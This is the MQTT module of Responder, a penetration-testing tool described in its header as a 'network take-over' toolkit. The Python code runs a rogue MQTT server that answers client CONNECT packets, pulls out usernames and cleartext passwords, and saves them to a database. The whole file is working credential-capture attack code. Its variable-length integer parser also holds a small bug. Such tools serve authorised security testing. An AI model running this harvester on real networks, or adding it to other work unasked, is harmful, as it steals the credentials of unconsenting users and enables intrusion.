#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from responder.src.utils import settings, NetworkSendBufferPython2or3, SaveToDb
from responder.src import settings

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler

from responder.src.packets import MQTTv3v4ResponsePacket, MQTTv5ResponsePacket


# Read N byte integer
def readInt(data, offset, numberOfBytes):
    value = int.from_bytes(data[offset : offset + numberOfBytes], "big")
    offset += numberOfBytes
    return (value, offset)


# Read binary data
def readBinaryData(data, offset):

    # Read number of bytes
    length, offset = readInt(data, offset, 2)

    # Read bytes
    value = data[offset : offset + length]
    offset += length

    return (value, offset)


# Same as readBinaryData() but without reading data
def skipBinaryDataString(data, offset):
    length, offset = readInt(data, offset, 2)
    offset += length
    return offset


# Read UTF-8 encoded string
def readString(data, offset):
    value, offset = readBinaryData(data, offset)

    return (value.decode("utf-8"), offset)


# Read variable byte integer
# (https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901011)
def readVariableByteInteger(data, offset):
    multiplier = 1
    value = 0
    while True:
        encodedByte = data[offset]
        offset += 1

        value = (encodedByte & 127) * multiplier

        if multiplier > 128 * 128 * 128:
            return None

        multiplier *= 128

        if encodedByte & 128 == 0:
            break

    return (value, offset)


class MqttPacket:

    USERNAME_FLAG = 0x80
    PASSWORD_FLAG = 0x40
    WILL_FLAG = 0x04

    def __init__(self, data):
        self.__isValid = True

        controllPacketType, offset = readInt(data, 0, 1)

        # check if CONNECT packet type
        if controllPacketType != 0x10:
            self.__isValid = False
            return

        # Remaining length
        remainingLength, offset = readVariableByteInteger(data, offset)

        # Protocol name
        protocolName, offset = readString(data, offset)

        # Check protocol name
        if protocolName != "MQTT" and protocolName != "MQIsdp":
            self.__isValid = False
            return

        # Check protocol version
        self.__protocolVersion, offset = readInt(data, offset, 1)

        # Read connect flag register
        connectFlags, offset = readInt(data, offset, 1)

        # Read keep alive (skip)
        offset += 2

        # MQTTv5 implements properties
        if self.__protocolVersion > 4:

            # Skip all properties
            propertiesLength, offset = readVariableByteInteger(data, offset)
            offset += propertiesLength

        # Get Client ID
        self.clientId, offset = readString(data, offset)

        if self.clientId == "":
            self.clientId = "<Empty>"

        # Skip Will
        if (connectFlags & self.WILL_FLAG) > 0:

            # MQTT v5 implements properties
            if self.__protocolVersion > 4:
                willProperties, offset = readVariableByteInteger(data, offset)

            # Skip will properties
            offset = skipBinaryDataString(data, offset)
            offset = skipBinaryDataString(data, offset)

        # Get Username
        if (connectFlags & self.USERNAME_FLAG) > 0:
            self.username, offset = readString(data, offset)
        else:
            self.username = "<Empty>"

        # Get Password
        if (connectFlags & self.PASSWORD_FLAG) > 0:
            self.password, offset = readString(data, offset)
        else:
            self.password = "<Empty>"

    def isValid(self):
        return self.__isValid

    def getProtocolVersion(self):
        return self.__protocolVersion

    def data(self, client):

        return {
            "module": "MQTT",
            "type": "Cleartext",
            "client": client,
            "hostname": self.clientId,
            "user": self.username,
            "cleartext": self.password,
            "fullhash": self.username + ":" + self.password,
        }


class MQTT(BaseRequestHandler):
    def handle(self):

        CONTROL_PACKET_TYPE_CONNECT = 0x10

        try:
            data = self.request.recv(2048)

            # Read control packet type
            controlPacketType, offset = readInt(data, 0, 1)

            # Skip non CONNECT packets
            if controlPacketType != CONTROL_PACKET_TYPE_CONNECT:
                return

            # Parse connect packet
            packet = MqttPacket(data)

            # Skip if it contains invalid data
            if not packet.isValid():
                # Return response
                return

            # Send response packet
            if packet.getProtocolVersion() < 5:
                responsePacket = MQTTv3v4ResponsePacket()
            else:
                responsePacket = MQTTv5ResponsePacket()

            self.request.send(NetworkSendBufferPython2or3(responsePacket))

            # Save to DB
            SaveToDb(packet.data(self.client_address[0]))

        except Exception:
            self.request.close()
            pass
